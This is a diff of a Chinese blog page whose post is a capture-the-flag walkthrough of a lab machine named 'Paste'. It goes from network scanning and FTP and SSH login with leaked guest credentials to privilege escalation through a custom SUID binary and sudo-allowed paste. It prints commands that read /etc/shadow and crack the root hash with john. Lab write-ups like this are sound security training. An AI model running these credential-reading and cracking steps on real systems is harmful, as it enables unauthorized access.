@@ -7,22 +7,22 @@
     <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
     <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
     <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
-<meta name="description" content="# 一、信息收集
+<meta name="description" content="## 一、信息收集
 
-## 1. 主机发现
+### 1. 主机发现
 
-在内网环境中，使用 arp-scan 扫描本地网络，发现存活主机。">
+首先，在内网环境中，我们使用 `arp-scan` 工具扫描本地网络，以发现存活的主机。">
 <meta property="og:title" content="内部_Paste">
-<meta property="og:description" content="# 一、信息收集
+<meta property="og:description" content="## 一、信息收集
 
-## 1. 主机发现
+### 1. 主机发现
 
-在内网环境中，使用 arp-scan 扫描本地网络，发现存活主机。">
+首先，在内网环境中，我们使用 `arp-scan` 工具扫描本地网络，以发现存活的主机。">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Paste.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Paste</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -88,151 +88,149 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
-<h2>1. 主机发现</h2>
-<p>在内网环境中，使用 arp-scan 扫描本地网络，发现存活主机。</p>
-<pre class="notranslate"><code class="notranslate">#—(kali@kali)-[/mnt/hgfs/gx/x]
-$ sudo arp-scan -l
+<div class="markdown-body" id="postBody"><h2>一、信息收集</h2>
+<h3>1. 主机发现</h3>
+<p>首先，在内网环境中，我们使用 <code class="notranslate">arp-scan</code> 工具扫描本地网络，以发现存活的主机。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
-192.168.205.1   00:50:56:c0:00:08 VMware, Inc.
-192.168.205.2   00:50:56:fc:94:2f VMware, Inc.
-192.168.205.193 08:00:27:6a:e7:aa PCS Systemtechnik GmbH
-192.168.205.254 00:50:56:fb:d6:c6 VMware, Inc.
-</code></pre>
-<p>目标主机 IP：192.168.205.193</p>
-<h2>2. 端口与服务扫描</h2>
-<p>使用 nmap 探测开放端口与服务。</p>
-<pre class="notranslate"><code class="notranslate">┌─(kali@kali)-[/mnt/hgfs/gx/x]
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.193 08:00:27:6a:e7:aa       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.
+...</pre></div>
+<p>扫描结果显示目标主机的 IP 地址为 <code class="notranslate">192.168.205.193</code>。</p>
+<h3>2. 端口与服务扫描</h3>
+<p>确定目标 IP 后，使用 <code class="notranslate">nmap</code> 对其进行端口扫描，探测其开放的端口和服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p- 192.168.205.193
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 23:24 EDT
-Nmap scan report for 192.168.205.193
+Nmap scan report <span class="pl-k">for</span> 192.168.205.193
 Host is up (0.00018s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT   STATE SERVICE
 21/tcp open  ftp
 22/tcp open  ssh
-80/tcp open  http
-</code></pre>
-<p>开放端口：FTP(21)、SSH(22)、HTTP(80)</p>
-<h1>二、初始访问</h1>
-<h2>1. FTP 信息泄露</h2>
-<p>尝试访问 FTP，查看是否存在匿名/弱口令。</p>
-<pre class="notranslate"><code class="notranslate">┌─(kali@kali)-[/mnt/hgfs/gx/x]
-└─$ ftp 192.168.205.193
+80/tcp open  http</pre></div>
+<p>扫描发现目标开放了三个常见服务端口：FTP (21), SSH (22) 和 HTTP (80)。</p>
+<h2>二、初始访问</h2>
+<h3>1. FTP 信息泄露</h3>
+<p>我们首先尝试访问 FTP 服务，查看是否存在匿名访问或敏感信息。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ftp 192.168.205.193                                                                                                                     
 Connected to 192.168.205.193.
-220 220 welcome to FTP Service Please use guest:guest to login
-</code></pre>
-<p>FTP 欢迎信息泄露凭据 guest:guest，测试登录：</p>
-<pre class="notranslate"><code class="notranslate">Name (192.168.205.193:kali): guest
+220 220 Welcome to FTP Service Please use guest:guest to login</pre></div>
+<p>FTP 服务的欢迎信息直接泄露了一组登录凭据：<code class="notranslate">guest:guest</code>。我们使用该凭据登录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Name (192.168.205.193:kali): guest
 331 Please specify the password.
-Password:
+Password: 
 230 Login successful.
-Remote system type is UNIX.
-ftp&gt; ls -la
+Remote system <span class="pl-c1">type</span> is UNIX.
 ...
-dr-xr-xr-x 2 1001 1001 4096 Jul 13 05:12 .
+ftp<span class="pl-k">&gt;</span> ls -la
 ...
-ftp&gt; mkdir test
-550 Permission denied.
-</code></pre>
-<p>能登录但权限极低，无法上传/创建。</p>
-<h2>2. SSH 登录</h2>
-<p>考虑同口令可能适用 SSH，尝试登录：</p>
-<pre class="notranslate"><code class="notranslate">┌─(kali@kali)-[/mnt/hgfs/gx/x]
+dr-xr-xr-x    2 1001     1001         4096 Jul 13 05:12 <span class="pl-c1">.</span>
+...
+ftp<span class="pl-k">&gt;</span> mkdir <span class="pl-c1">test</span>
+550 Permission denied.</pre></div>
+<p>虽然成功登录，但 <code class="notranslate">guest</code> 用户权限极低，无法上传或创建任何文件。</p>
+<h3>2. SSH 登录</h3>
+<p>考虑到 FTP 和 SSH 服务同时开放，我们推测 <code class="notranslate">guest:guest</code> 这组凭据可能同样适用于 SSH 服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh guest@192.168.205.193
-guest@192.168.205.193's password:
-...
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Thu Jul 17 23:32:23 2025 from 192.168.205.128
-guest@Paste:~$ id
-uid=1001(guest) gid=1001(guest) groups=1001(guest)
-</code></pre>
-<p>获得低权 Shell。</p>
-<h1>三、权限提升</h1>
-<h2>1. 提权至 film 用户</h2>
-<p>查找 SUID 文件：</p>
-<pre class="notranslate"><code class="notranslate">guest@Paste:~$ find / -perm -4000 -type f 2&gt;/dev/null
+guest@192.168.205.193<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">...</span>
+<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="pl-s">permitted by applicable law.</span>
+<span class="pl-s">Last login: Thu Jul 17 23:32:23 2025 from 192.168.205.128</span>
+<span class="pl-s">guest@Paste:~$ id</span>
+<span class="pl-s">uid=1001(guest) gid=1001(guest) groups=1001(guest)</span></pre></div>
+<p>尝试成功，我们通过 SSH 获得了目标系统的一个低权限 Shell。</p>
+<h2>三、权限提升</h2>
+<h3>1. 提权至 <code class="notranslate">film</code> 用户</h3>
+<p>获得初始访问权限后，我们开始在系统中寻找提权的机会。首先，我们查找具有 SUID 权限位的特殊文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">guest@Paste:<span class="pl-k">~</span>$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
 /usr/bin/chsh
+...
 /usr/bin/sudo
 /usr/bin/passwd
 /usr/local/bin/change
-...
-</code></pre>
-<p>分析异常 SUID 程序：</p>
-<pre class="notranslate"><code class="notranslate">guest@Paste:/opt$ strings /usr/local/bin/change
+...</pre></div>
+<p>在结果中，<code class="notranslate">/usr/local/bin/change</code> 这个不寻常的 SUID 文件引起了我们的注意。我们使用 <code class="notranslate">strings</code> 命令来分析该二进制文件的内容，寻找线索。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">guest@Paste:/opt$ strings /usr/local/bin/change
 ...
 /var/www/html/password.log
 Failed to open password file
 ...
 chpasswd
-Failed to execute chpasswd command
+Failed to execute chpasswd <span class="pl-c1">command</span>
 film
 %s:%s
-Password for %s successfully changed
-...
-</code></pre>
-<p>关键信息：</p>
+Password <span class="pl-k">for</span> %s successfully changed
+...</pre></div>
+<p>从 <code class="notranslate">strings</code> 的输出中，我们得到了几个关键信息：</p>
 <ul>
-<li>读取 /var/www/html/password.log</li>
-<li>调用 chpasswd</li>
-<li>硬编码用户名 film</li>
+<li>程序会读取 <code class="notranslate">/var/www/html/password.log</code> 文件。</li>
+<li>程序会调用 <code class="notranslate">chpasswd</code> 命令。</li>
+<li>程序中硬编码了用户名 <code class="notranslate">film</code>。</li>
 </ul>
-<p>查看日志文件：</p>
-<pre class="notranslate"><code class="notranslate">guest@Paste:/opt$ cat /var/www/html/password.log
-42956292
-</code></pre>
-<p>推测该内容为 film 密码，切换用户：</p>
-<pre class="notranslate"><code class="notranslate">guest@Paste:/opt$ su film
-Password:
+<p>基于以上线索，我们推断：这个程序的功能是读取 <code class="notranslate">/var/www/html/password.log</code> 文件的内容，并将其设置为 <code class="notranslate">film</code> 用户的密码。</p>
+<p>于是，我们直接查看该日志文件的内容：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">guest@Paste:/opt$ cat /var/www/html/password.log
+42956292</pre></div>
+<p>我们得到了 <code class="notranslate">film</code> 用户的密码 <code class="notranslate">42956292</code>。现在，我们切换到 <code class="notranslate">film</code> 用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">guest@Paste:/opt$ su film
+Password: 
 film@Paste:/opt$ id
-uid=1002(film) gid=1002(film) groups=1002(film)
-</code></pre>
-<p>成功提权至 film。</p>
-<h2>2. 提权至 root</h2>
-<p>查看 sudo 权限：</p>
-<pre class="notranslate"><code class="notranslate">film@Paste:/opt$ sudo -l
+uid=1002(film) gid=1002(film) groups=1002(film)</pre></div>
+<p>成功提权至 <code class="notranslate">film</code> 用户。</p>
+<h3>2. 提权至 <code class="notranslate">root</code></h3>
+<p>成为 <code class="notranslate">film</code> 用户后，我们检查其 <code class="notranslate">sudo</code> 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">film@Paste:/opt$ sudo -l
+...
 User film may run the following commands on Paste:
-    (ALL) NOPASSWD: /usr/bin/paste
-</code></pre>
-<p>可无密码以 root 执行 /usr/bin/paste，可读任意文件。</p>
-<p>读取 root flag：</p>
+    (ALL) NOPASSWD: /usr/bin/paste</pre></div>
+<p>结果显示，<code class="notranslate">film</code> 用户可以无需密码以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">/usr/bin/paste</code> 命令。<code class="notranslate">paste</code> 命令通常用于合并文件行，但如果指定一个文件作为参数，它会直接输出该文件的内容。我们可以利用这一点来读取系统上的任意文件。</p>
+<p><strong>直接读取 root flag:</strong></p>
 <pre class="notranslate"><code class="notranslate">film@Paste:/opt$ sudo /usr/bin/paste /root/root.txt
-f1ag{root-6ab2177cfaffa72807624d043ecb6c13}
+flag{root-6ab2177cfaffa72807624d043ecb6c13}
 </code></pre>
-<p>获取 root shell（可选）：</p>
+<p>我们成功读取了 <code class="notranslate">root.txt</code>。为了获得一个完整的 <code class="notranslate">root</code> shell，我们可以进一步利用这个漏洞。</p>
+<p><strong>获取 Root Shell:</strong></p>
 <ol>
-<li>读取 /etc/shadow</li>
-</ol>
-<pre class="notranslate"><code class="notranslate">film@Paste:/opt$ sudo /usr/bin/paste /etc/shadow
-root:$6$jJev7FIbmMhP8iVA$p1.bGLOCx5BsAzgCrbp/FgF56k6HXP0QFb5pCaZzAJ1N7qOhZjTJymyk9CMRbc8JGy5DXF1/BiwP9JEZ7o7mp0:20282:0:99999:7:::
+<li>
+<p>利用 <code class="notranslate">paste</code> 读取 <code class="notranslate">/etc/shadow</code> 文件，获取 <code class="notranslate">root</code> 用户的密码哈希。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">film@Paste:/opt$ sudo /usr/bin/paste /etc/shadow
+root:<span class="pl-smi">$6</span><span class="pl-smi">$jJev7FIbmMhP8iVA$p1</span>.bGLOCx5BsAzgCrbp/FgF56k6HXP0QFb5pCaZzAJ1N7qOhZjTJymyk9CMRbc8JGy5DXFl/BiwP9JEZ7o7mp0:20282:0:99999:7:::
+...</pre></div>
+</li>
+<li>
+<p>在我们的攻击机上，使用 <code class="notranslate">john</code> 和 <code class="notranslate">rockyou.txt</code> 字典来破解这个哈希。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span>
 ...
-</code></pre>
-<ol start="2">
-<li>攻击机用 john 和 rockyou.txt 爆破</li>
-</ol>
-<pre class="notranslate"><code class="notranslate">┌──(kali@kali)-[/mnt/hgfs/gx/x]
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+sexybitch<span class="pl-k">!</span>       (root)     
 ...
-sexybitch! (root)
-Session completed.
-</code></pre>
-<ol start="3">
-<li>切换 root</li>
+Session completed. </pre></div>
+<p>我们成功破解出 <code class="notranslate">root</code> 用户的密码为 <code class="notranslate">sexybitch!</code>。</p>
+</li>
+<li>
+<p>使用该密码切换到 <code class="notranslate">root</code> 用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">film@Paste:/opt$ su -
+Password: 
+root@Paste:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+</li>
 </ol>
-<pre class="notranslate"><code class="notranslate">film@Paste:/opt$ su -
-Password:
-root@Paste:~# id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-<p>获得 root 权限。</p>
-<h2>3. 获取所有 Flag</h2>
-<pre class="notranslate"><code class="notranslate">root@Paste:~# cat /root/root.txt
-f1ag{root-6ab2177cfaffa72807624d043ecb6c13}
-root@Paste:~# cat /home/film/user.txt
-f1ag{user-f307bc02d0f7e60e52d128a0c27b8e34}
-</code></pre></div>
+<p>至此，我们获得了完整的 <code class="notranslate">root</code> 权限。</p>
+<h3>3. 获取所有 Flag</h3>
+<p>最后，我们收集所有的 flag。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Paste:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt</span>
+flag{root-6ab2177cfaffa72807624d043ecb6c13}
+
+root@Paste:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/film/user.txt</span>
+flag{user-f307bc02d0f7e60e52d128a0c27b8e34}<span class="pl-s"><span class="pl-pds">`</span><span class="pl-pds">`</span><span class="pl-pds">`</span></span></pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
